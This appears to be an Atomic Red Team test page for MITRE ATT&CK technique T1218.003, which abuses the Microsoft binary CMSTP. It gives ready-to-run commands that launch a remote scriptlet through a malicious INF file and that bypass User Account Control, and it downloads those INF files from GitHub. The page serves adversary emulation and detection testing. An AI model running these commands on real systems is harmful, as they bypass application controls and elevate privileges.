# T1218.003 - Signed Binary Proxy Execution: CMSTP
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1218/003)
<blockquote>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)</blockquote>

## Atomic Test #1 - CMSTP Executing Remote Scriptlet
Adversaries may supply CMSTP.exe with INF files infected with malicious commands

**Supported Platforms:** Windows


**auto_generated_guid:** 34e63321-9683-496b-bbc1-7566bc55e624





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| inf_file_path | Path to the INF file | path | PathToAtomicsFolder&#92;T1218.003&#92;src&#92;T1218.003.inf|


#### Attack Commands: Run with `command_prompt`! 


```cmd
cmstp.exe /s #{inf_file_path}
```




#### Dependencies:  Run with `powershell`!
##### Description: INF file must exist on disk at specified location (#{inf_file_path})
##### Check Prereq Commands:
```powershell
if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf" -OutFile "#{inf_file_path}"
```

## Atomic Test #2 - CMSTP Executing UAC Bypass
Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file

**Supported Platforms:** Windows

| inf_file_uac | Path to the INF file | path | PathToAtomicsFolder&#92;T1218.003&#92;src&#92;T1218.003_uacbypass.inf|


#### Attack Commands: Run with `command_prompt`! 


```cmd
cmstp.exe /s #{inf_file_uac} /au
```




#### Dependencies:  Run with `powershell`!
##### Description: INF file must exist on disk at specified location (#{inf_file_uac})
##### Check Prereq Commands:
```powershell
if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
